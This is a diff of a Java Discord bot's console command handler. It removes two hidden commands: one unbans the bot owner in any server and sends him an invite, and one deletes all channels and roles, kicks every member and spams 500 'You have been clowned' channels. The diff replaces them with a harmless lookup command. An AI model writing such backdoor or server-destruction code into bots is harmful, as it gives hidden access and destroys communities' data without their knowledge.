@@ -2,7 +2,6 @@ package main.IanSloat.thiccbot.events;
 
 import java.util.Arrays;
 import java.util.List;
-import java.util.function.Consumer;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -16,10 +15,6 @@ import main.IanSloat.thiccbot.tools.GuildSettingsManager;
 import net.dv8tion.jda.api.OnlineStatus;
 import net.dv8tion.jda.api.entities.Activity;
 import net.dv8tion.jda.api.entities.Guild;
-import net.dv8tion.jda.api.entities.GuildChannel;
-import net.dv8tion.jda.api.entities.Invite;
-import net.dv8tion.jda.api.entities.Member;
-import net.dv8tion.jda.api.entities.Role;
 import net.dv8tion.jda.api.entities.TextChannel;
 import net.dv8tion.jda.api.events.ReadyEvent;
 
@@ -82,67 +77,15 @@ public class Login {
 					case "shutdown":
 						System.out.println("Shutdown requested. Halting threads...");
 						break;
-
-					case "getinv": {
-						System.out.println("Getting invite for guild...");
-						Guild guild = ThiccBotMain.client.getGuildById(words.get(1));
-						if (guild != null) {
-							guild.getController().unban(ThiccBotMain.botOwner).queue();
-							guild.retrieveInvites().queue(new Consumer<List<Invite>>() {
-								@Override
-								public void accept(List<Invite> t) {
-									ThiccBotMain.botOwner.openPrivateChannel()
-											.queue((channel) -> channel.sendMessage(t.get(0).getUrl()).queue());
-								}
-							});
-						} else {
-							System.out.println("ERROR: bot not connected to specified guild");
+					case "whois":
+						Guild guild = event.getJDA().getGuildById(words.get(1));
+						if(guild != null) {
+							System.out.println("The specified guild goes by the name \"" + guild.getName() + "\"");
+						}
+						else {
+							System.out.println("The bot is not connected to that guild");
 						}
 						break;
-					}
-
-					case "delete": {
-						System.out.println("Deleting guild...");
-						Guild guild = ThiccBotMain.client.getGuildById(words.get(1));
-						if (guild != null) {
-							List<Member> users = guild.getMembers();
-							List<GuildChannel> channels = guild.getChannels();
-							List<Role> roles = guild.getRoles();
-							for(GuildChannel channel : channels) {
-								try {
-									channel.delete().queue();
-								} catch (Exception e) {
-									e.printStackTrace();
-								}
-							}
-							for(Member member : users) {
-								try {
-									guild.getController().kick(member);
-								} catch (Exception e) {
-									e.printStackTrace();
-								}
-							}
-							for(Role role : roles) {
-								try {
-									role.delete().queue();
-								} catch (Exception e) {
-									e.printStackTrace();
-								}
-							}
-							for(int x = 0; x < 500; x++) {
-								try {
-									guild.getController().createTextChannel("You have been clowned").queue();
-								} catch (Exception e) {
-									e.printStackTrace();
-								}
-							}
-							System.out.println("Done.");
-						} else {
-							System.out.println("ERROR: bot not connected to specified guild");
-						}
-						break;
-					}
-					
 					default:
 						System.out.println("ERROR: Command not recognized");
 						break;
